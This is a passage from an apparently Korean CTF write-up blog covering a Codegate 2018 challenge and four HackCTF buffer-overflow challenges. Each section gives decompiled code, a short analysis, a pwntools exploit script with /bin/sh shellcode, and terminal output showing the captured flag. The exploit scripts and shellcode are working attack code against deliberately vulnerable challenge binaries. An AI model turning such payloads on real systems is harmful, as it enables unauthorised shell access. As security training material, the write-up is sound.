<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ python exploit.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;BaskinRobins31&#39;: pid 16607</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;pocas&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31&#x2F;BaskinRobins31&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] pppr : 0x40087a</span><br><span class="line">[*] bss : 0x602090</span><br><span class="line">[*] read_plt : 0x400700</span><br><span class="line">[*] read_got : 0x602040</span><br><span class="line">[*] write_plt : 0x4006d0</span><br><span class="line">[*] system_offset : 0x4f550</span><br><span class="line">[*] read_offset : 0x110140</span><br><span class="line">[*] libc_base : 0x7f621a53c000</span><br><span class="line">[*] system : 0x7f621a58b550</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00$ ls</span><br><span class="line">BaskinRobins31    exploit.py  flag</span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;The Korean name of &quot;Puss in boots&quot; is &quot;My mom is an alien&quot;&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : flag{The Korean name of “Puss in boots” is “My mom is an alien”}</p>
</blockquote>
<hr>
<h2 id="PWN-D-5-2021-01-29"><a href="#PWN-D-5-2021-01-29" class="headerlink" title="PWN D+5 (2021.01.29)"></a>PWN D+5 (2021.01.29)<br></h2><hr>
<p>HackCTF Challenge : 내 버퍼가 흘러넘친다!!!</p>
<p><strong>이번에는 BOF 취약점을 이용해서 쉬운 쉘 코드 관련 문제를 하나 풀어보겠습니다.</strong><br></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input : &quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>코드를 보면 s 변수를 14h 만큼 생성해주고, read 함수를 이용해서 name을 입력 받고, printf 함수로 출력하고, 또 gets 함수를 이용해서 s를 입력 받는 것을 볼 수 있습니다. 여기서 gets 함수로 입력값을 받고, 입력값의 대한 검증이 없기 때문에 BOF 취약점이 발생합니다. 그래서 그냥 name 변수에 쉘코드를 넣어주고, RET 값으로 name의 주소를 주면 된다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x080484f4 &lt;+41&gt;:	push   0x804a060</span><br><span class="line">0x080484f9 &lt;+46&gt;:	push   0x0</span><br><span class="line">0x080484fb &lt;+48&gt;:	call   0x8048370 &lt;read@plt&gt;</span><br></pre></td></tr></table></figure>
<p><strong>gdb를 이용해서 name의 주소가 0x804a060라는 것을 알 수 있습니다..</strong><br></p>
<ul>
<li>시나리오</li>
</ul>
<ol>
<li>name 변수에 쉘 코드를 입력해준다. 쉘 코드는 그냥 검색해서 구했다.</li>
<li>BOF 취약점을 이용해서 RET를 name의 주수로 덮어준다.</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3003</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Name : &quot;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span></span><br><span class="line">payload += p32(<span class="number">0x804a060</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input : &quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python prob.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3003: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;1_l0v3_70p_pwn3r_m4lhyuk&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : HackCTF{1_l0v3_70p_pwn3r_m4lhyuk}</p>
</blockquote>
<hr>
<p>HackCTF Challenge : x64 Buffer Overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s, envp);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>코드를 보면 scanf 함수를 이용해서 s를 입력 받고 있습니다. 하지만 길이에 대한 검증이 없어 BOF 취약점이 발생합니다.</strong><br></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callMeMaybe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *path; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  path = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">  v2 = <span class="string">&quot;-p&quot;</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/bash&quot;</span>, &amp;path, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>그리고 다른 함수가 뭐가 있나 보니 callMeMaybe라는 함수가 존재했습니다. 해당 함수를 실행시키면 execve 함수를 이용해서 쉘을 실행 시키는 것을 볼 수 있습니다. 그러니 BOF 취약점을 이용해서 RET를 ccallMeMaybe 함수의 주소로 덮으면 될 거 같습니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3004</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x400606</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">280</span></span><br><span class="line">payload += p64(shell_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python 64bof_basic.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3004: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;64b17_b0f_15_51mpl3_700&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : HackCTF{64b17_b0f_15_51mpl3_700}</p>
</blockquote>
<hr>
<p>HackCTF Challenge : x64 Simple_size_BOF</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-6D30h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;buf: %p\n&quot;</span>, &amp;v4);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>코드를 보면 printf 함수를 이용해서 v4의 주소를 출력하고, gets 함수를 이용해서 v4의 값을 입력하고 있는 것을 볼 수 있습니다. 이번 문제도 gets 함수로 입력을 받고, 검증 로직이 없어 BOF 취약점이 발생합니다. 그래서 쉘을 실행시켜주는 함수가 있나 확인해 보니 없었고, ROP를 하려고 보호 기법도 확인해보니 아무 것도 되어 있지 않아 그냥 쉘 코드를 박아주기로 했습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7ffc7b644760</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7ffc99272180</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7fffcba94780</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ </span><br></pre></td></tr></table></figure>
<p><strong>바이너리 파일을 실행해보니 buf의 주소가 계속 바뀌는 것을 알 수 있습니다. 아마 ASLR이 적용되어 있는 거 같습니다. 하지만 그냥 바이너리가 실행되는 동시에 출력되는 buf의 주소를 가져와서 사용하면 됩니다. 마찬가지로 64 비트 쉘 코드도 검색해서 구했습니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3005</span>)</span><br><span class="line"></span><br><span class="line">shell_code = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">5</span>:], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;buf addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(buf_addr)))</span><br><span class="line"></span><br><span class="line">payload = shell_code</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * (<span class="number">27960</span> - <span class="built_in">len</span>(shell_code)) <span class="comment"># buf + sfp - shell_code_length</span></span><br><span class="line">payload += p64(buf_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python simple_size_bof.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3005: Done</span><br><span class="line">[*] buf addr : 0x7fff99022510</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;s000000_5m4ll_4nd_5m4ll_51z3_b0f&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : HackCTF{s000000_5m4ll_4nd_5m4ll_51z3_b0f}</p>
</blockquote>
<hr>
<p>HackCTF Challenge : Simple_Overflow_ver_2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+13h] [ebp-89h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">128</span>]; <span class="comment">// [esp+14h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+94h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="number">121</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data : &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot; %[^\n]s&quot;</span>, s) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = i;</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !(i &amp; <span class="number">0xF</span>) )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%p: &quot;</span>, &amp;s[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %c&quot;</span>, (<span class="keyword">unsigned</span> __int8)s[i]);</span><br><span class="line">        <span class="keyword">if</span> ( i % <span class="number">16</span> == <span class="number">15</span> )</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nAgain (y/n): &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( __isoc99_scanf(<span class="string">&quot; %c&quot;</span>, &amp;v5) &amp;&amp; (v5 == <span class="number">121</span> || v5 == <span class="number">89</span>) );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>코드를 보면 scanf 함수를 이용해서 s의 값을 입력해주고, printf로 입력 값을 출력해주고, <code>&quot;Again (y/n): &quot;</code>를 출력해서 한 번 더 입력할 거냐고 묻는다. <code>y</code>를 누르면 다시 입력을 하고, <code>n</code>을 누르면 종료를 합니다. 하지면 s의 크기는 136인데 입력은 무제한으로 받을 수 있어 BOF 취약점이 발생합니다. 그래서 그냥 이번 문제도 shell code를 s에 넣어주고, ret를 s의 주소로 덮어주면 쉘을 딸 수 있습니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3006</span>)</span><br><span class="line"></span><br><span class="line">shell_code = <span class="string">&quot;\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data : &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">0</span>:<span class="number">10</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;buf addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(buf_addr)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Again (y/n): &quot;</span>, <span class="string">&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = shell_code</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shell_code)) <span class="comment"># buffer + sfp + shellcode_length</span></span><br><span class="line">payload += p32(buf_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data : &quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python simple_overflow_ver2.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3006: Done</span><br><span class="line">[*] buf addr : 0xffe73ef0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">0xffe73ef0:  1 � \x8d A \x0b\x99 h &#x2F; s h</span><br><span class="line">Again (y&#x2F;n): $ cat flag</span><br><span class="line">$ cat  flag</span><br><span class="line">HackCTF&#123;y0u_d1d_7h3_45516nm3n7_5ucc355fully!&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : HackCTF{y0u_d1d_7h3_45516nm3n7_5ucc355fully!}</p>
</blockquote>
<hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-1-2021-01-25"><span class="toc-number">1.</span> <span class="toc-text">PWN D+1 (2021.01.25)
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-2-2021-01-26"><span class="toc-number">2.</span> <span class="toc-text">PWN D+2 (2021.01.26)
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-3-2021-01-27"><span class="toc-number">3.</span> <span class="toc-text">PWN D+3 (2021.01.27)
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-4-2021-01-28"><span class="toc-number">4.</span> <span class="toc-text">PWN D+4 (2021.01.28)
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-5-2021-01-29"><span class="toc-number">5.</span> <span class="toc-text">PWN D+5 (2021.01.29)
</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/01/25/2021-01-25-pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/01/25/2021-01-25-pwn/&text=Pwnable Exploitation"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/01/25/2021-01-25-pwn/&is_video=false&description=Pwnable Exploitation"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Pwnable Exploitation&body=Check out this article: http://example.com/2021/01/25/2021-01-25-pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/01/25/2021-01-25-pwn/&name=Pwnable Exploitation&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/01/25/2021-01-25-pwn/&t=Pwnable Exploitation"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2021
    Jeongwon Jo
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
